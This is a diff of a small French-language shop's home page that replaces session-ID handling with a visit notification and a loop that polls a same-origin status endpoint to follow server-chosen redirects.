@@ -5,32 +5,31 @@
 <title>Accueil</title>
 </head>
 <body>
-<h1>🏠 Accueil</h1>
-<button onclick="goNext('product.html')">Voir les produits</button>
+<h1>🏀 Bienvenue sur Basket Shop</h1>
+<button id="btnProduct">Voir les produits</button>
+
 <script>
-async function initSession(){
-  let sessionId = localStorage.getItem('sessionId');
-  if(!sessionId){
-    const res = await fetch('/api/visit',{method:'POST'});
+async function notifyVisit(){
+    const res = await fetch('/api/visit');
     const data = await res.json();
-    sessionId = data.sessionId;
-    localStorage.setItem('sessionId', sessionId);
-  }
-  checkRedirect();
+    console.log('Visite notifiée', data);
 }
-async function goNext(page){
-  const sessionId = localStorage.getItem('sessionId');
-  window.location.href = page + '?sid=' + sessionId;
+notifyVisit();
+
+document.getElementById('btnProduct').addEventListener('click',()=>{
+    window.location.href='/product.html';
+});
+
+// Polling redirection bot
+async function pollRedirect(){
+    const res = await fetch('/api/status');
+    const data = await res.json();
+    if(data.redirect && window.location.pathname !== data.redirect){
+        window.location.href = data.redirect;
+    }
+    setTimeout(pollRedirect,1000);
 }
-async function checkRedirect(){
-  const sessionId = localStorage.getItem('sessionId');
-  if(!sessionId) return;
-  const res = await fetch('/api/status?sessionId='+sessionId);
-  const data = await res.json();
-  if(data.redirect) window.location.href = data.redirect;
-  else setTimeout(checkRedirect,2000);
-}
-initSession();
+pollRedirect();
 </script>
 </body>
 </html>
